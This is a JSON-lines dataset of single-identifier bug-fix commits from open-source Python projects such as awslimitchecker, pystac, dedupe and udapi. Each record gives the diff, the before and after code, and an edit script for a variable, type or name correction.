{"project": "cloud-bots", "commit_sha": "b7c3563600b64485471003594ecb14d33237bd07", "parent_sha": "ce5857acad30c1f368a96728d9d9ab458d49ae23", "file_path": "index.py", "project_url": "https://github.com/Dome9/cloud-bots", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ def lambda_handler(event, context):\n     text_output_array = [\"-------------------------\\n\"]\n \n     raw_message = event['Records'][0]['Sns']['Message']\n-    print(message) #CW Logs prints JSON prettier. Printing this for easier recreation. \n+    print(raw_message) #CW Logs prints JSON prettier. Printing this for easier recreation. \n     message = json.loads(raw_message)\n     print(message) #log the input for troubleshooting\n     \n", "before": "print ( message )", "after": "print ( raw_message )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:message\", 3, 11, 3, 18], \"raw_message\"]]"}
{"project": "hnn", "commit_sha": "b81c148ce79a953a97569fd82fbc4923dc2f0d66", "parent_sha": "6c905dbd421381f7c5a1dbafa6ddad8b64c6d94d", "file_path": "hnn_qt5.py", "project_url": "https://github.com/jonescompneurolab/hnn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2334,7 +2334,7 @@ class OptEvokedInputParamDialog (EvokedInputParamDialog):\n           range_min = max(0, value - timing_bound)\n           range_max = min(self.simlength, value + timing_bound)\n           self.opt_params[tab_name]['mean'] = value\n-          self.opt_params[tab_name]['sigma'] = value\n+          self.opt_params[tab_name]['sigma'] = timing_sigma\n           self.opt_params[tab_name]['user_start'] = range_min\n           self.opt_params[tab_name]['user_end'] = range_max\n         except KeyError:\n", "before": "self . opt_params [ tab_name ] [ 'sigma' ] = value", "after": "self . opt_params [ tab_name ] [ 'sigma' ] = timing_sigma", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:value\", 3, 48, 3, 53], \"timing_sigma\"]]"}
{"project": "cdlib", "commit_sha": "a945654af4a075df861d4e63c80db0ddd0bf87ba", "parent_sha": "59ed8d2b39b9ad6ca136373875fa8e2b5ff8cda3", "file_path": "cdlib/test/test_community_discovery_models.py", "project_url": "https://github.com/GiulioRossetti/cdlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -283,6 +283,6 @@ class CommunityDiscoveryTests(unittest.TestCase):\n         coms = algorithms.frc_fgsn(g, 1, 0.5, 3)\n         self.assertEqual(type(coms.communities), list)\n         if len(coms.communities) > 0:\n-            self.assertEqual(type(coms.communities[0][0]), str)\n+            self.assertEqual(type(coms.communities[0][0]), tuple)\n             self.assertIsInstance(coms.allocation_matrix, dict)\n             self.assertEqual(len(coms.allocation_matrix), g.number_of_nodes())\n", "before": "self . assertEqual ( type ( coms . communities [ 0 ] [ 0 ] ) , str )", "after": "self . assertEqual ( type ( coms . communities [ 0 ] [ 0 ] ) , tuple )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:str\", 3, 60, 3, 63], \"tuple\"]]"}
{"project": "udapi-python", "commit_sha": "a058df75180befe63c53e76e80e1d5f48875283f", "parent_sha": "4e3e034d2b0d8ce07b4cd14395bef7250a8e7365", "file_path": "udapi/core/node.py", "project_url": "https://github.com/udapi/udapi-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -667,7 +667,7 @@ class Node(object):\n             if self.precedes(left_node.parent) and left_node.parent not in ancestors:\n                 return True\n         for right_node in all_nodes[self.ord:]:\n-            if right_node.parent.precedes(node) and right_node.parent not in ancestors:\n+            if right_node.parent.precedes(self) and right_node.parent not in ancestors:\n                 return True\n         return False\n \n", "before": "if right_node . parent . precedes ( node ) and right_node . parent not in ancestors : return True", "after": "if right_node . parent . precedes ( self ) and right_node . parent not in ancestors : return True", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:node\", 3, 43, 3, 47], \"self\"]]"}
{"project": "udapi-python", "commit_sha": "ddf9bc6f9aa59b5d0e46f8fa9835348bc4f96779", "parent_sha": "e38fdd7773737776b26bc097a88f3f1e3f4e6bb5", "file_path": "udapi/block/write/conllu.py", "project_url": "https://github.com/udapi/udapi-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -102,7 +102,7 @@ class Conllu(BaseWriter):\n                 print('\\t'.join((mwt.ord_range,\n                                  '_' if mwt.form is None else mwt.form,\n                                  '_\\t_\\t_\\t_\\t_\\t_\\t_',\n-                                 '_' if node._misc is None else str(mwt.misc))))\n+                                 '_' if mwt._misc is None else str(mwt.misc))))\n                 last_mwt_id = mwt.words[-1]._ord\n \n             if node._parent is None:\n", "before": "print ( '\\t' . join ( ( mwt . ord_range , '_' if mwt . form is None else mwt . form , '_\\t_\\t_\\t_\\t_\\t_\\t_' , '_' if node . _misc is None else str ( mwt . misc ) ) ) )", "after": "print ( '\\t' . join ( ( mwt . ord_range , '_' if mwt . form is None else mwt . form , '_\\t_\\t_\\t_\\t_\\t_\\t_' , '_' if mwt . _misc is None else str ( mwt . misc ) ) ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:node\", 3, 41, 3, 45], \"mwt\"]]"}
{"project": "jivago", "commit_sha": "cb0bff18cd06996aa1821eeb72140c1dadef7b04", "parent_sha": "8c22af558694351b2029d5bb8dd8c67208f08a06", "file_path": "jivago/wsgi/filters/json_serialization_filter.py", "project_url": "https://github.com/keotl/jivago", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,6 +14,6 @@ class JsonSerializationFilter(Filter):\n \n         chain.doFilter(request, response)\n \n-        if isinstance(request.body, dict):\n+        if isinstance(response.body, dict):\n             response.body = json.dumps(response.body)\n             response.headers['Content-Type'] = 'application/json'\n", "before": "if isinstance ( request . body , dict ) : response . body = json . dumps ( response . body ) response . headers [ 'Content-Type' ] = 'application/json'", "after": "if isinstance ( response . body , dict ) : response . body = json . dumps ( response . body ) response . headers [ 'Content-Type' ] = 'application/json'", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:request\", 3, 23, 3, 30], \"response\"]]"}
{"project": "pyramid_apispec", "commit_sha": "d642d3c0b6a040ab441af6f224890c7c7a171d3b", "parent_sha": "d0132bc967a2837c8bf7f2c5ee6d849055808c53", "file_path": "tests/tests.py", "project_url": "https://github.com/ergo/pyramid_apispec", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -297,7 +297,7 @@ class TestExplorer(object):\n         assert route_intr.discriminator == \"pyramid_apispec.api_explorer_path\"\n \n     def test_registration_route_args(self):\n-        with pytest.raises(ModuleNotFoundError):\n+        with pytest.raises(ImportError):\n             with Configurator() as config:\n                 config.add_route(\"openapi_spec\", \"/openapi.json\")\n                 config.include(\"pyramid_apispec.views\")\n", "before": "with pytest . raises ( ModuleNotFoundError ) : with Configurator ( ) as config : config . add_route ( \"openapi_spec\" , \"/openapi.json\" ) config . include ( \"pyramid_apispec.views\" )", "after": "with pytest . raises ( ImportError ) : with Configurator ( ) as config : config . add_route ( \"openapi_spec\" , \"/openapi.json\" ) config . include ( \"pyramid_apispec.views\" )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:ModuleNotFoundError\", 3, 28, 3, 47], \"ImportError\"]]"}
{"project": "pystac", "commit_sha": "645a1a364994b7088c1b53b54c63c1db2cc68f66", "parent_sha": "f2afd5ad4653e98fa1523f30b9bb23931cfb6f78", "file_path": "pystac/extensions/base.py", "project_url": "https://github.com/azavea/pystac", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class PropertiesExtension(ABC):\n \n-    def _get_property(self, prop_name: str, typ: Type[P]) -> Optional[P]:\n+    def _get_property(self, prop_name: str, _typ: Type[P]) -> Optional[P]:\n         maybe_property: Optional[P] = self.properties.get(prop_name)\n         if maybe_property is not None:\n             return maybe_property\n", "before": "def _get_property ( self , prop_name : str , typ : Type [ P ] ) -> Optional [ P ] : maybe_property : Optional [ P ] = self . properties . get ( prop_name ) if maybe_property is not None : return maybe_property", "after": "def _get_property ( self , prop_name : str , _typ : Type [ P ] ) -> Optional [ P ] : maybe_property : Optional [ P ] = self . properties . get ( prop_name ) if maybe_property is not None : return maybe_property", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:typ\", 1, 45, 1, 48], \"_typ\"]]"}
{"project": "pystac", "commit_sha": "2b7cb9a22edf3c5ac0393ddad0db39ccaacceead", "parent_sha": "0ba1a1d7583b2cae3b6c558e7a7433cdd69419a4", "file_path": "pystac/extensions/label.py", "project_url": "https://github.com/azavea/pystac", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -722,7 +722,7 @@ class SummariesLabelExtension(SummariesExtension):\n         return self.summaries.get_list(PROPERTIES_PROP)\n \n     @label_properties.setter\n-    def label_properties(self, v: Optional[List[LabelClasses]]) -> None:\n+    def label_properties(self, v: Optional[List[str]]) -> None:\n         self._set_summary(PROPERTIES_PROP, v)\n \n     @property\n", "before": "def label_properties ( self , v : Optional [ List [ LabelClasses ] ] ) -> None : self . _set_summary ( PROPERTIES_PROP , v )", "after": "def label_properties ( self , v : Optional [ List [ str ] ] ) -> None : self . _set_summary ( PROPERTIES_PROP , v )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:LabelClasses\", 3, 49, 3, 61], \"str\"]]"}
{"project": "blockchain-ops", "commit_sha": "59cebcc3c00ab7a4a10389f22f7b9d0ef02625dd", "parent_sha": "1f7ab6fb24d2379624a7b22ce05b3cadfc2e7198", "file_path": "tasks.py", "project_url": "https://github.com/kinecosystem/blockchain-ops", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ def glide(c, version='v0.13.2'):\n     elif os_name == 'darwin':\n         arch = 'darwin-amd64'\n     else:\n-        raise Failure(os_name_res, reason='Only supported on OSx and Linux')\n+        raise Failure(os_name, reason='Only supported on OSx and Linux')\n     print('Glide arch: {arch}'.format(arch=arch))\n \n     # avoid redownloading file if exists\n", "before": "else : raise Failure ( os_name_res , reason = 'Only supported on OSx and Linux' )", "after": "else : raise Failure ( os_name , reason = 'Only supported on OSx and Linux' )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:os_name_res\", 3, 23, 3, 34], \"os_name\"]]"}
{"project": "dlhub_sdk", "commit_sha": "16ca6e832924a45cfe30354b761b38ef2134e54c", "parent_sha": "97eb434cd4017c89e038649e663510117c41d591", "file_path": "dlhub_sdk/client.py", "project_url": "https://github.com/DLHub-Argonne/dlhub_sdk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -141,7 +141,7 @@ class DLHubClient(BaseClient):\n             raise AttributeError('Please enter name in the form <user>/<servable_name>')\n \n         # Create a query for a single servable\n-        query = self.query.match_servable('/'.join(splitname[1:]))\\\n+        query = self.query.match_servable('/'.join(split_name[1:]))\\\n             .match_owner(split_name[0]).add_sort(\"dlhub.publication_date\", False)\\\n             .search(limit=1)\n \n", "before": "query = self . query . match_servable ( '/' . join ( splitname [ 1 : ] ) ) . match_owner ( split_name [ 0 ] ) . add_sort ( \"dlhub.publication_date\" , False ) . search ( limit = 1 )", "after": "query = self . query . match_servable ( '/' . join ( split_name [ 1 : ] ) ) . match_owner ( split_name [ 0 ] ) . add_sort ( \"dlhub.publication_date\" , False ) . search ( limit = 1 )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:splitname\", 3, 52, 3, 61], \"split_name\"]]"}
{"project": "cb4", "commit_sha": "d1e09e1b7c8436af1391b54ec92df54680dec6c3", "parent_sha": "8b35d61ecd2df747539f52e157f1f2d17ab5e699", "file_path": "vj4/util/domainjob.py", "project_url": "https://github.com/joint-online-judge/cb4", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,4 +23,4 @@ def wrap(method):\n   if method.__module__ == '__main__':\n     argmethod._methods[method.__name__] = method\n     argmethod._methods[method.__name__ + '_all'] = run\n-  return run\n+  return method\n", "before": "return run", "after": "return method", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:run\", 3, 10, 3, 13], \"method\"]]"}
{"project": "jivago", "commit_sha": "a19c4b385660b4015fb04261f9fc68771638a9b2", "parent_sha": "4f236b95747e67cab16228897a3c88b14ed86208", "file_path": "jivago/config/abstract_context.py", "project_url": "https://github.com/keotl/jivago", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ class AbstractContext(object):\n \n     def __init__(self):\n         self.serviceLocator = ServiceLocator()\n-        self.INSTANCE = self\n+        AbstractContext.INSTANCE = self\n         self.serviceLocator.bind(ServiceLocator, self.serviceLocator)\n \n     def configure_service_locator(self):\n", "before": "self . INSTANCE = self", "after": "AbstractContext . INSTANCE = self", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 9, 3, 13], \"AbstractContext\"]]"}
{"project": "deep-learning-from-scratch", "commit_sha": "544af4086f7079e77bde060b9edc1f8a1378dbed", "parent_sha": "bab934c625a98b60c10a16dd6a7959e59fcad2a1", "file_path": "common/multi_layer_net.py", "project_url": "https://github.com/s-wiki/deep-learning-from-scratch", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -97,7 +97,7 @@ class MultiLayerNet:\n     def accuracy(self, x, t):\n         y = self.predict(x)\n         y = np.argmax(y, axis=1)\n-        if t.ndim != 1 : T = np.argmax(t, axis=1)\n+        if t.ndim != 1 : t = np.argmax(t, axis=1)\n \n         accuracy = np.sum(y == t) / float(x.shape[0])\n         return accuracy\n", "before": "T = np . argmax ( t , axis = 1 )", "after": "t = np . argmax ( t , axis = 1 )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:T\", 3, 26, 3, 27], \"t\"]]"}
{"project": "erpnext-v7", "commit_sha": "c03a3bf5809ed34a8980d33747f71e1ee29f916e", "parent_sha": "e9ba712fe3317a6dcc778703ae9bc66e99c04eea", "file_path": "erpnext/accounts/doctype/payment_request/payment_request.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -98,7 +98,7 @@ class PaymentRequest(Document):\n \t\t\n \t\tbank_amount = self.grand_total\n \t\tif party_account_currency == ref_doc.company_currency and party_account_currency != self.currency:\n-\t\t\tparty_amount = self.base_grand_total\n+\t\t\tparty_amount = ref_doc.base_grand_total\n \t\telse:\n \t\t\tparty_amount = self.grand_total\n \t\t\t\t\t\n", "before": "party_amount = self . base_grand_total", "after": "party_amount = ref_doc . base_grand_total", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 19, 3, 23], \"ref_doc\"]]"}
{"project": "depot_tools", "commit_sha": "4039b31851e245a6f39110f478cb3a4bccec220a", "parent_sha": "6b5faf51dd14a2c54b2482c7af590e60e577541c", "file_path": "git_cache.py", "project_url": "https://github.com/Neozaru/depot_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -158,7 +158,7 @@ class Mirror(object):\n       if sys.platform.startswith('win'):\n         for suffix in ('.bat', '.cmd', '.exe'):\n           alt_target = target + suffix\n-          if os.path.isfile(alt_target) and os.access(target, os.X_OK):\n+          if os.path.isfile(alt_target) and os.access(alt_target, os.X_OK):\n             return alt_target\n     return None\n \n", "before": "if os . path . isfile ( alt_target ) and os . access ( target , os . X_OK ) : return alt_target", "after": "if os . path . isfile ( alt_target ) and os . access ( alt_target , os . X_OK ) : return alt_target", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:target\", 3, 55, 3, 61], \"alt_target\"]]"}
{"project": "mackup", "commit_sha": "675e81a11be5cb3e9b814cc8034601567ab945e8", "parent_sha": "371c4b78ce54166765b6114d0be84ff0ebe705eb", "file_path": "mackup/utils.py", "project_url": "https://github.com/rizkysyazuli/mackup", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -288,7 +288,7 @@ def get_box_folder_location():\n         with open(box_sync_path, 'r') as sync_path:\n             box_home = sync_path.read()\n     except IOError:\n-        error('Unable to find your Box prefs at ' , sync_path , ' =(')\n+        error('Unable to find your Box prefs at ' , box_sync_path , ' =(')\n \n     return box_home\n \n", "before": "except IOError : error ( 'Unable to find your Box prefs at ' , sync_path , ' =(' )", "after": "except IOError : error ( 'Unable to find your Box prefs at ' , box_sync_path , ' =(' )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:sync_path\", 3, 53, 3, 62], \"box_sync_path\"]]"}
{"project": "wger_stark", "commit_sha": "0933fc81ebe47e9abf4edfa8289ee1f6a4f924b3", "parent_sha": "bd90c2b6d82a1462a349d8503ee1a5dca53ef9c8", "file_path": "wger/manager/api/views.py", "project_url": "https://github.com/andela/wger_stark", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -185,7 +185,7 @@ class SetViewSet(WgerOwnerObjectModelViewSet):\n         '''\n         Only allow access to appropriate objects\n         '''\n-        return Setting.objects.filter(exerciseday__training__user=self.request.user)\n+        return Set.objects.filter(exerciseday__training__user=self.request.user)\n \n     def get_owner_objects(self):\n", "before": "return Setting . objects . filter ( exerciseday__training__user = self . request . user )", "after": "return Set . objects . filter ( exerciseday__training__user = self . request . user )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:Setting\", 3, 16, 3, 23], \"Set\"]]"}
{"project": "wger_stark", "commit_sha": "5045bb381d58c32f237b2c93ee27bb86553b6fe2", "parent_sha": "e2ed879489005ddb2f9fe562b5c7f5c34f98be5e", "file_path": "manager/views.py", "project_url": "https://github.com/andela/wger_stark", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -231,7 +231,7 @@ def registration(request):\n             password = form.cleaned_data['password1']\n             user = Django_User.objects.create_user(username,\n                                                    '',\n-                                                   password1)\n+                                                   password)\n             user.save()\n             user = authenticate(username=username, password=password)\n             django_login(request, user)\n", "before": "user = Django_User . objects . create_user ( username , '' , password1 )", "after": "user = Django_User . objects . create_user ( username , '' , password )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:password1\", 3, 52, 3, 61], \"password\"]]"}
{"project": "sympy", "commit_sha": "4ccbe13f012cd5a513d4725face6c20f44743d0d", "parent_sha": "eb1c141fc0a91caa4e3d14914d649497336db7a8", "file_path": "sympy/logic/algorithms/dpll2.py", "project_url": "https://github.com/grannydatasoup/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ def dpll_satisfiable(expr):\n \n     >>> from sympy import symbols\n     >>> from sympy.abc import A, B\n-    >>> from sympy.logic.algorithms.dpll import dpll_satisfiable\n+    >>> from sympy.logic.algorithms.dpll2 import dpll_satisfiable\n     >>> dpll_satisfiable(A & ~B)\n     {A: True, B: False}\n     >>> dpll_satisfiable(A & ~A)\n", "before": "from sympy . logic . algorithms . dpll import dpll_satisfiable", "after": "from sympy . logic . algorithms . dpll2 import dpll_satisfiable", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:dpll\", 3, 37, 3, 41], \"dpll2\"]]"}
{"project": "puppetboard", "commit_sha": "294e2d6559891fb62e7560d78b0bb67002a8a260", "parent_sha": "12b0d09f9b89c0c1e88f64e7dd4e6e03d5cfdb6e", "file_path": "puppetboard/app.py", "project_url": "https://github.com/mterzo/puppetboard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -837,7 +837,7 @@ def catalogs(env):\n         nodes = get_or_abort(puppetdb.nodes,\n                              query=query,\n                              with_status=False,\n-                             order_by=oder_by_str)\n+                             order_by=order_by_str)\n         nodes, temp = tee(nodes)\n \n         for node in temp:\n", "before": "nodes = get_or_abort ( puppetdb . nodes , query = query , with_status = False , order_by = oder_by_str )", "after": "nodes = get_or_abort ( puppetdb . nodes , query = query , with_status = False , order_by = order_by_str )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:oder_by_str\", 3, 39, 3, 50], \"order_by_str\"]]"}
{"project": "awslimitchecker", "commit_sha": "7da3badd72826f8c903b68a693b8fd76b0175400", "parent_sha": "a6ad6b24b642128d0573f10a0c1e783b9dc01b74", "file_path": "awslimitchecker/tests/test_versioncheck.py", "project_url": "https://github.com/sstarcher/awslimitchecker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1448,7 +1448,7 @@ class Test_AGPLVersionChecker_Acceptance(object):\n         if self._check_git_pushed() != 0:\n             expected_tag += '*'\n         expected = 'awslimitchecker {v} (see <{u}> for source code)'.format(\n-            v='%s@%s' % (_VERSION, expected_commit),\n+            v='%s@%s' % (_VERSION, expected_tag),\n             u=self.git_url\n         )\n         assert expected in version_output\n", "before": "expected = 'awslimitchecker {v} (see <{u}> for source code)' . format ( v = '%s@%s' % ( _VERSION , expected_commit ) , u = self . git_url )", "after": "expected = 'awslimitchecker {v} (see <{u}> for source code)' . format ( v = '%s@%s' % ( _VERSION , expected_tag ) , u = self . git_url )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:expected_commit\", 3, 36, 3, 51], \"expected_tag\"]]"}
{"project": "dedupe", "commit_sha": "7339fba263fc1f5cd52cb3cd7cfc55553cd14c47", "parent_sha": "97c5dc89ce4b8dab40414cdb645f2a008baed26b", "file_path": "dedupe/api.py", "project_url": "https://github.com/c-rap/dedupe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -179,7 +179,7 @@ class RecordLinkMatching(Matching) :\n         \n     def _checkBlock(self, block) :\n         try :\n-            base, target = first_block\n+            base, target = block\n             base.items() and target.items()\n         except :\n             raise ValueError(\"Each block must be a made up of two \"\n", "before": "base , target = first_block", "after": "base , target = block", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:first_block\", 3, 28, 3, 39], \"block\"]]"}
{"project": "awslimitchecker", "commit_sha": "e91598fddde6122ed89892a3fdfaf4c1bbfc512c", "parent_sha": "dc12e7da6ea68b235c67687fcd40a25e791b432c", "file_path": "awslimitchecker/services/ec2.py", "project_url": "https://github.com/sstarcher/awslimitchecker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ class Ec2Service(AwsService):\n                     continue\n                 key = 'Running On-Demand {t} instances'.format(\n                     t=inst.instance_type)\n-                result[key] += 1\n+                ondemand[key] += 1\n \n     def get_limits(self):\n", "before": "result [ key ] += 1", "after": "ondemand [ key ] += 1", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:result\", 3, 17, 3, 23], \"ondemand\"]]"}
{"project": "awslimitchecker", "commit_sha": "07968deac2386884f088360bb8b24120a5c53ff1", "parent_sha": "3bae5bd42b1d78442fb3d3c0ff21e5c7d9b34b44", "file_path": "awslimitchecker/tests/test_version.py", "project_url": "https://github.com/sstarcher/awslimitchecker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -104,7 +104,7 @@ class TestVersion(object):\n                         reason='py32 versionfinder test')\n     def test__get_version_info_py32(self):\n         with patch('awslimitchecker.version.logger') as mock_logger:\n-            with pytest.raises(ImportError):\n+            with pytest.raises(NameError):\n                 version._get_version_info()\n         assert mock_logger.mock_calls == [\n             call.exception('Error checking installed version; this installation'\n", "before": "with pytest . raises ( ImportError ) : version . _get_version_info ( )", "after": "with pytest . raises ( NameError ) : version . _get_version_info ( )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:ImportError\", 3, 32, 3, 43], \"NameError\"]]"}
{"project": "awslimitchecker", "commit_sha": "323445b259d7efac00be4dab8b8be0212b194b85", "parent_sha": "1925aa99c3b47a8ac33f985d6faaebecedd4be9d", "file_path": "awslimitchecker/checker.py", "project_url": "https://github.com/sstarcher/awslimitchecker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -508,7 +508,7 @@ class AwsLimitChecker(object):\n \n         :param service: the name(s) of one or more service(s) to return\n           results for\n-        :type service: lisr\n+        :type service: list\n         :param use_ta: check Trusted Advisor for information on limits\n         :type use_ta: bool\n         :returns: dict of service name (string) to nested dict\n", "before": "service : lisr", "after": "service : list", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:lisr\", 3, 24, 3, 28], \"list\"]]"}
{"project": "GMhil", "commit_sha": "c67fa7371a7e726d0964592d5d15076f32efcb04", "parent_sha": "387a75a92489e2f8379465d7e5ed4cd56c2339c2", "file_path": "haas/cli.py", "project_url": "https://github.com/gfaline/GMhil", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -282,7 +282,7 @@ def headnode_connect_network(headnode, nic, network):\n     do_post(url, data={'network':network})\n \n @cmd\n-def headnode_detach_network(headnode, nic):\n+def headnode_detach_network(headnode, hnic):\n     \"\"\"Detach <headnode> from the network on given <nic>\"\"\"\n     url = object_url('headnode', headnode, 'hnic', hnic, 'detach_network')\n     do_post(url)\n", "before": "def headnode_detach_network ( headnode , nic ) : \"\"\"Detach <headnode> from the network on given <nic>\"\"\" url = object_url ( 'headnode' , headnode , 'hnic' , hnic , 'detach_network' ) do_post ( url )", "after": "def headnode_detach_network ( headnode , hnic ) : \"\"\"Detach <headnode> from the network on given <nic>\"\"\" url = object_url ( 'headnode' , headnode , 'hnic' , hnic , 'detach_network' ) do_post ( url )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:nic\", 3, 39, 3, 42], \"hnic\"]]"}
{"project": "dedupe", "commit_sha": "6aaa4c2b9788a3361f3bd95a97ccbb5db649826a", "parent_sha": "a50a964ad3aefeef101a72721efc003a08d6d0ff", "file_path": "dedupe/tfidf.py", "project_url": "https://github.com/c-rap/dedupe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ def invertIndex(data, tfidf_fields, constrained_matching=False, df_index=None):\n                                                     'occurrences': set(constrained_inverted_index[field][token])}\n                 else :\n                     inverted_index[field][token] = {'idf': idf, \n-                                                    'occurrences': set(occurences)}\n+                                                    'occurrences': set(occurrences)}\n \n     for field in token_vector:\n         field_inverted_index = inverted_index[field]\n", "before": "inverted_index [ field ] [ token ] = { 'idf' : idf , 'occurrences' : set ( occurences ) }", "after": "inverted_index [ field ] [ token ] = { 'idf' : idf , 'occurrences' : set ( occurrences ) }", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:occurences\", 3, 72, 3, 82], \"occurrences\"]]"}
{"project": "teknologkoren-se", "commit_sha": "fc0126594e72e883b5962ceb7309de2b5ef926dd", "parent_sha": "5137e7979e2c5a663323bcee24829f14d13d2a7c", "file_path": "teknologkoren_se/views/errors.py", "project_url": "https://github.com/rfjord/teknologkoren-se", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ def handle_error(e):\n \n     else:\n         try:\n-            response = render_template('errors/{}.html'.format(error.code))\n+            response = render_template('errors/{}.html'.format(e.code))\n         except TemplateNotFound:\n             response = e\n         return response, e.code\n", "before": "else : try : response = render_template ( 'errors/{}.html' . format ( error . code ) )", "after": "else : try : response = render_template ( 'errors/{}.html' . format ( e . code ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:error\", 3, 64, 3, 69], \"e\"]]"}
{"project": "tensorflow_apps", "commit_sha": "f5ec0349e2a2ba5850ec53ef8200bbffdd6991f3", "parent_sha": "662b50b1a58b13828fc6bb6f7cdea07ea54cbf9c", "file_path": "src/cnn/harmonics.py", "project_url": "https://github.com/jswelling/tensorflow_apps", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -144,9 +144,9 @@ def extract_and_pair_single(images, full_chain, l_dict, top_l, layers):\n                 padHrmBlk = np.zeros_like(top_weights)\n                 hrmD1, hrmD2 = hrmBlk.shape\n                 padHrmBlk[:hrmD1, :hrmD2] = hrmBlk\n-                padSampBlk = psh.MakeGridGLQ(hrmRotBlk, top_nodes)\n+                padSampBlk = psh.MakeGridGLQ(padHrmBlk, top_nodes)\n                 rslt[layerOffset, :, :] = padSampBlk\n-                layerOffset += 1\n+            layerOffset += 1\n         sampOffset += sampBlkSz\n     return rslt\n \n", "before": "padSampBlk = psh . MakeGridGLQ ( hrmRotBlk , top_nodes )", "after": "padSampBlk = psh . MakeGridGLQ ( padHrmBlk , top_nodes )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:hrmRotBlk\", 3, 46, 3, 55], \"padHrmBlk\"]]"}
